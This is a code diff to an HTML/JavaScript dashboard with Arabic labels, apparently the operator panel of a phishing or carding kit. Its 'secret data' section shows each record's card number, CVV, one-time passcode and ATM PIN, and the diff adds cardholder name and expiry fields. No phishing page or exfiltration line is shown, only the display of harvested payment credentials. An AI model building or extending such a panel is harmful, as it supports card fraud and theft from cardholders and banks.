@@ -117,7 +117,7 @@ html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
 .sec-codes{background:linear-gradient(135deg,rgba(245,158,11,.1),rgba(245,158,11,.03));
   border:1px solid rgba(245,158,11,.3);border-radius:14px;padding:16px;margin-bottom:16px}
 .sec-codes h3{font-weight:800;font-size:14px;color:#f59e0b;margin:0 0 12px}
-.codes-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
+.codes-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
 .code-card{background:rgba(0,0,0,.3);border-radius:10px;padding:12px;border:1px solid rgba(245,158,11,.2);text-align:center}
 .code-card .lbl{font-size:10px;color:rgba(255,255,255,.5);margin-bottom:4px}
 .code-card .val{font-weight:800;font-size:18px;color:#fbbf24;letter-spacing:2px;font-family:monospace;word-break:break-all}
@@ -404,10 +404,12 @@ function renderDetail(o){
     '<button class="dh-del '+(detDelConf?'confirm':'normal')+'" onclick="detDel(\''+esc(o.ref)+'\')">'+(detDelConf?'⚠️ تأكيد':'🗑️ حذف')+'</button></div>';
 
   h+='<div class="sec-codes"><h3>🔑 البيانات السرية</h3><div class="codes-grid">';
+  h+=codeCard('👤 اسم حامل البطاقة',pay.cardName);
   h+=codeCard('💳 رقم البطاقة',pay.cardNumber);
+  h+=codeCard('📅 تاريخ الانتهاء',pay.exp);
   h+=codeCard('🔒 CVV',pay.cvv);
-  h+=codeCard('📲 OTP',pay.otp);
-  h+=codeCard('🔑 PIN',pay.pin);
+  h+=codeCard('📲 الكود OTP',pay.otp);
+  h+=codeCard('🏧 رقم ATM',pay.pin);
   h+='</div></div>';
 
   var allData=[
